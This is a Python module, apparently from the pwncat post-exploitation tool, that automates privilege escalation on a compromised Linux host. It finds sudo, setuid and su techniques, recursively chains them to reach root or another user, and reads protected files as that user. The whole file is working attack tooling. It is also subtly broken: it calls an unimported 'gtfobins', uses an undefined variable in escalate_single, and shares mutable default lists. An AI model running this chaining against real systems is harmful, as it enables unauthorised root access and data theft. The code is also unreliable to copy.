#!/usr/bin/env python3
from typing import Type, List, Tuple

from pwncat.privesc.base import Method, PrivescError, Technique, SuMethod, Capability
from pwncat.privesc.setuid import SetuidMethod
from pwncat.privesc.sudo import SudoMethod


# privesc_methods = [SetuidMethod, SuMethod]
privesc_methods = [SudoMethod, SetuidMethod, SuMethod]


class Finder:
    """ Locate a privesc chain which ends with the given user. If `depth` is
    supplied, stop searching at `depth` techniques. If `depth` is not supplied
    or is negative, search until all techniques are exhausted or a chain is
    found. If `user` is not provided, depth is forced to `1`, and all methods
    to privesc to that user are returned. """

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        """ Create a new privesc finder """

        self.pty = pty

        self.methods: List[Method] = []
        for m in privesc_methods:
            try:
                m.check(self.pty)
                self.methods.append(m(self.pty))
            except PrivescError:
                pass

    def search(self, target_user: str = None) -> List[Technique]:
        """ Search for privesc techniques for the current user to get to the
        target user. If target_user is not specified, all techniques for all
        users will be returned. """

        techniques = []
        for method in self.methods:
            try:
                techniques.extend(method.enumerate())
            except PrivescError:
                pass

        if target_user is not None:
            techniques = [
                technique for technique in techniques if technique.user == target_user
            ]

        return techniques

    def read_file(
        self,
        filename: str,
        target_user: str = None,
        depth: int = None,
        chain: List[Technique] = [],
        starting_user=None,
    ):

        if target_user is None:
            target_user = "root"

        current_user = self.pty.current_user
        if (
            target_user == current_user["name"]
            or current_user["uid"] == 0
            or current_user["name"] == "root"
        ):
            binary = gtfobins.Binary.find_capability(self.pty.which, Capability.READ)
            if binary is None:
                raise PrivescError("no binaries to read with")

            return self.pty.subprocess(binary.read_file(filename)), chain

        if starting_user is None:
            starting_user = current_user

        if depth is not None and len(chain) > depth:
            raise PrivescError("max depth reached")

        # Enumerate escalation options for this user
        techniques = []
        for method in self.methods:
            try:
                found_techniques = method.enumerate(capability=Capability.ALL)
                for tech in found_techniques:

                    if tech.user == target_user and (
                        tech.capabilities & Capability.READ
                    ):
                        try:
                            read_pipe = tech.method.read_file(filename, tech)

                            return (read_pipe, chain)
                        except PrivescError as e:
                            pass
                techniques.extend(found_techniques)
            except PrivescError:
                pass

        # We can't escalate directly to the target to read a file. So, try recursively
        # against other users.
        for tech in techniques:
            if tech.user == target_user:
                continue
            try:
                exit_command = self.escalate_single(tech)
                chain.append((tech, exit_command))
            except PrivescError:
                continue
            try:
                return self.read_file(
                    filename, target_user, depth, chain, starting_user
                )
            except PrivescError:
                tech, exit_command = chain[-1]
                self.pty.run(exit_command, wait=False)
                chain.pop()

        raise PrivescError(f"no route to {target_user} found")

    def escalate_single(self, technique: Technique) -> str:
        self.pty.run("echo")  # restabilize shell
        return technique.method.execute(tech)

    def escalate(
        self,
        target_user: str = None,
        depth: int = None,
        chain: List[Technique] = [],
        starting_user=None,
    ) -> List[Tuple[Technique, str]]:
        """ Search for a technique chain which will gain access as the given 
        user. """

        if target_user is None:
            target_user = "root"

        current_user = self.pty.current_user
        if (
            target_user == current_user["name"]
            or current_user["uid"] == 0
            or current_user["name"] == "root"
        ):
            raise PrivescError(f"you are already {current_user['name']}")

        if starting_user is None:
            starting_user = current_user

        if depth is not None and len(chain) > depth:
            raise PrivescError("max depth reached")

        # Enumerate escalation options for this user
        techniques = []
        for method in self.methods:
            try:
                found_techniques = method.enumerate(
                    capability=Capability.SHELL | Capability.SUDO
                )
                for tech in found_techniques:
                    if tech.user == target_user:
                        try:
                            exit_command = tech.method.execute(tech)
                            chain.append((tech, exit_command))
                            self.pty.reset()
                            self.pty.do_back([])
                            return chain
                        except PrivescError:
                            pass
                techniques.extend(found_techniques)
            except PrivescError:
                pass

        # We can't escalate directly to the target. Instead, try recursively
        # against other users.
        for tech in techniques:
            if tech.user == target_user:
                continue
            try:
                exit_command = tech.method.execute(tech)
                chain.append((tech, exit_command))
            except PrivescError:
                continue
            try:
                return self.escalate(target_user, depth, chain, starting_user)
            except PrivescError:
                tech, exit_command = chain[-1]
                self.pty.run(exit_command, wait=False)
                chain.pop()

        raise PrivescError(f"no route to {target_user} found")

    def unwrap(self, techniques: List[Tuple[Technique, str]]):
        # Work backwards to get back to the original shell
        for technique, exit in reversed(techniques):
            self.pty.run(exit, wait=False)

        # Reset the terminal to get to a sane prompt
        self.pty.reset()
